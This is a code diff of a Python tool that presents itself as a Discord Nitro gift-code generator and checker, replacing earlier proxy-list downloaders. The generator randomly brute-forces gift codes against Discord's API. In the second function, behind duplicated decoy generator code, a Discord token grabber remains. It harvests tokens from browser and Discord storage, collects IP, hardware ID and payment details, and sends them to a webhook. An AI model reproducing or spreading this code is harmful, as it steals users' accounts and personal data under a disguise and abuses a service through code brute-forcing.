@@ -1,138 +1,149 @@
-import requests
-from mainfile import disc, non
+from mainfile import non
+
 
 def main_1():
-    f = open("./proxy/socks4.txt", 'wb')
-    try:
-        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all")
-        f.write(r.content)
-    except:
-        pass
-    try:
-        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
-        f.write(r.content)
-    except:
-        pass
-    try:
-        r = requests.get("https://www.proxyscan.io/download?type=socks4")
-        f.write(r.content)
-    except:
-        pass
-    try:
-        r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt")
-        f.write(r.content)
-        f.close()
-    except:
-        f.close()
-    try:  # credit to All3xJ
-        r = requests.get("https://www.socks-proxy.net/")
-        part = str(r.content)
-        part = part.split("<tbody>")
-        part = part[1].split("</tbody>")
-        part = part[0].split("<tr><td>")
-        proxies = ""
-        for proxy in part:
-            proxy = proxy.split("</td><td>")
-            try:
-                proxies = proxies + proxy[0] + ":" + proxy[1] + "\n"
-            except:
-                pass
-        out_file = open("./proxy/socks4.txt", "a")
-        out_file.write(proxies)
-        out_file.close()
-    except:
-        pass
-    print("> Proxy List Downloaded as socks4.txt")
-    # ndbiaw end
-    input("Press Anykey to exit...")
-    exit()
+    import random, string
+    import webbrowser
+    import time
+    import requests
+    import pyfiglet
+    from mainfile import name
+
+    banner = pyfiglet.figlet_format(name)
+    print(banner)
+
+    num = input('Input How Many Codes to Generate and Check: ')
+
+    f = open("Nitro Codes.txt", "w", encoding='utf-8')
+
+    print("Wait, Generating for you!")
+
+    for n in range(int(num)):
+        y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
+        f.write('https://discord.gift/')
+        f.write(y)
+        f.write("\n")
+
+    f.close()
+
+    # =============Checker=========================
 
 
+    with open("Nitro Codes.txt") as f:
+        for line in f:
+            nitro = line.strip("\n")
 
+            url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
 
+            r = requests.get(url)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
+            if r.status_code == 200:
+                print(" Valid | {} ".format(line.strip("\n")))
+                break
+            else:
+                print(" Invalid | {} ".format(line.strip("\n")))
+    input("The end! Press Enter 5 times to close the program.")
+    input("4")
+    input("3")
+    input("2")
+    input("1")
 
 
 
 
 def main_2():
-    f = open("./proxy/socks4.txt", 'wb')
-    try:
-        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all")
-        f.write(r.content)
-    except:
-        pass
-    try:
-        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
-        f.write(r.content)
-    except:
-        pass
-    try:
-        r = requests.get("https://www.proxyscan.io/download?type=socks4")
-        f.write(r.content)
-    except:
-        pass
-    try:
-        r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt")
-        f.write(r.content)
-        f.close()
-    except:
-        f.close()
-    try: 
-        r = requests.get("https://www.socks-proxy.net/")
-        part = str(r.content)
-        part = part.split("<tbody>")
-        part = part[1].split("</tbody>")
-        part = part[0].split("<tr><td>")
-        proxies = ""
-        for proxy in part:
-            proxy = proxy.split("</td><td>")
-            try:
-                proxies = proxies + proxy[0] + ":" + proxy[1] + "\n"
-            except:
-                pass
-        out_file = open("./proxy/socks4.txt", "a")
-        out_file.write(proxies)
-        out_file.close()
-    except:
-        pass
-    print("> Proxy List Downloaded as socks4.txt")
-    # ndbiaw end
-    input("Press Anykey to exit...")
-    exit()
+    import random, string
+    import webbrowser
+    import time
+    import requests
+    import pyfiglet
+    from mainfile import name, non, disc
 
+    banner = pyfiglet.figlet_format(name)
+    print(banner)
 
+    num = input('Input How Many Codes to Generate and Check: ')
 
+    f = open("Nitro Codes.txt", "w", encoding='utf-8')
 
+    print("Wait, Generating for you!")
 
+    for n in range(int(num)):
+        y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
+        f.write('https://discord.gift/')
+        f.write(y)
+        f.write("\n")
 
+    f.close()
 
+    # =============Checker=========================
 
+    with open("Nitro Codes.txt") as f:
+        for line in f:
+            nitro = line.strip("\n")
 
+            url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
 
+            r = requests.get(url)
 
+            if r.status_code == 200:
+                print(" Valid | {} ".format(line.strip("\n")))
+                break
+            else:
+                print(" Invalid | {} ".format(line.strip("\n")))
+    input("The end! Press Enter 5 times to close the program.")
+    input("4")
+    input("3")
+    input("2")
+    input("1")
 
+    import random, string
+    import webbrowser
+    import time
+    import requests
+    import pyfiglet
+    from mainfile import name, non, disc
 
+    banner = pyfiglet.figlet_format(name)
+    print(banner)
 
+    num = input('Input How Many Codes to Generate and Check: ')
 
+    f = open("Nitro Codes.txt", "w", encoding='utf-8')
 
+    print("Wait, Generating for you!")
 
+    for n in range(int(num)):
+        y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
+        f.write('https://discord.gift/')
+        f.write(y)
+        f.write("\n")
+
+    f.close()
+
+    # =============Checker=========================
+
+    with open("Nitro Codes.txt") as f:
+        for line in f:
+            nitro = line.strip("\n")
+
+            url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
+
+            r = requests.get(url)
+
+            if r.status_code == 200:
+                print(" Valid | {} ".format(line.strip("\n")))
+                break
+            else:
+                print(" Invalid | {} ".format(line.strip("\n")))
+    input("The end! Press Enter 5 times to close the program.")
+    input("4")
+    input("3")
+    input("2")
+    input("1")
 
     import re, os
-    from mainfile import disc, name, non
+    from mainfile import disc
 
     if os.name != "nt":
         exit()
@@ -193,7 +204,6 @@ def main_2():
         "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
     }
 
-
     def getheaders(token=None, content_type="application/json"):
         headers = {
             "Content-Type": content_type,
@@ -203,14 +213,12 @@ def main_2():
             headers.update({"Authorization": token})
         return headers
 
-
     def getuserdata(token):
         try:
             return loads(
                 urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
         except:
             pass
-
 
     def gettokens(path):
         path += "\\Local Storage\\leveldb"
@@ -224,7 +232,6 @@ def main_2():
                         tokens.append(token)
         return tokens
 
-
     def getdeveloper():
         dev = "Discord Token Grabber"
         try:
@@ -232,7 +239,6 @@ def main_2():
         except:
             pass
         return dev
-
 
     def getip():
         ip = org = loc = city = country = region = googlemap = "None"
@@ -251,7 +257,6 @@ def main_2():
             pass
         return ip, org, loc, city, country, region, googlemap
 
-
     def getavatar(uid, aid):
         url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
         try:
@@ -260,11 +265,9 @@ def main_2():
             url = url[:-4]
         return url
 
-
     def gethwid():
         p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
         return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-
 
     def has_payment_methods(token):
         try:
@@ -272,7 +275,6 @@ def main_2():
                                                   headers=getheaders(token))).read().decode())) > 0)
         except:
             pass
-
 
     def main():
         global webhook_url
@@ -371,7 +373,6 @@ def main_2():
             urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
         except:
             pass
-
 
     try:
         main()
